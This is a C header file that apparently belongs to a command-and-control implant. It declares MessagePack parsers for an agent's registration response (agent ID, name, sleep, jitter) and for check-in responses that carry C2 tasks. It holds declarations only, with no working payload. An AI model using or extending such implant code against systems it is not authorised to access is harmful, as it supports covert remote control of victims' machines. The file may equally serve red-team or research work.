#ifndef _MSGPACK_H
#define _MSGPACK_H

#include "common.h"
#include "transport.h"

// Parse RegisterResponse: {"agent_id":str, "name":str, "sleep":int, "jitter":int}
BOOL MsgpackParseRegisterResponse(PBYTE pData, DWORD dwDataLen,
                                   PCHAR szAgentID, DWORD dwAgentIDSize,
                                   PCHAR szName, DWORD dwNameSize,
                                   INT* pSleep, INT* pJitter);

// Parse CheckInResponse: {"tasks":[{...},...]}
BOOL MsgpackParseCheckInResponse(PBYTE pData, DWORD dwDataLen,
                                  PC2_TASK pTasks, DWORD dwMaxTasks, DWORD* pdwTaskCount);

#endif // _MSGPACK_H
